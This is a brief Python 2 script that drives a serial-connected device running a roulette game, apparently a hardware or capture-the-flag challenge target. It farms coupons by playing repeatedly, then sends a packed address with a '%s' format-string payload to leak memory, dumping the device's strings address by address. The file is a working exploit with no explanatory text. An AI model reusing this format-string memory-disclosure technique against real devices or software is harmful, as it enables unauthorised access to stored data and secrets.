import serial
import sys
import struct

def print_output(ser_out):
	for line in ser_out:
		print line.rstrip()

def play_roulette(ser):
	ser.write('1\r')
	ser.write('r\r')
	ser.readlines()
	ser.write('5\r')
	output = ser.readlines()
	#print output
	#print_output(output)
	for line in output:
		if 'balance' in line:
			balance_str = line
		if 'coupons' in line:
			coupon_str = line
	return balance_str[17:].strip(), coupon_str[24:].strip()


def ser_write_then_read(input_string):
	ser.write(input_string)
	output = ser.readlines()
	print "Sending: {}\n output array: {}\n".format(input_string, output)
	print_output(output)

ser = serial.Serial('/dev/ttyUSB0', timeout=.25, baudrate=19200)
ser.readlines()
ser.write('4\r')
ser.readlines()
balance, coupons = play_roulette(ser)
addr = 0x0101 # starts at 0x101 because null strings are annoying
while(1):
	balance, coupons = play_roulette(ser)
	if balance == '0':
		ser.write('4\r')
		ser.readlines()
	if coupons != '0':
		ser.write('3\r')
		print_output(ser.readlines())
		ser.write(struct.pack("<H", addr)+'||%s||\r')
		test = ser.readlines()
		#print test
		print_output(test)
		key = test[0].strip()
		s_length = len(key)
		print 'string at address {:04x}: {}'.format(addr, key[2:])
		addr += s_length



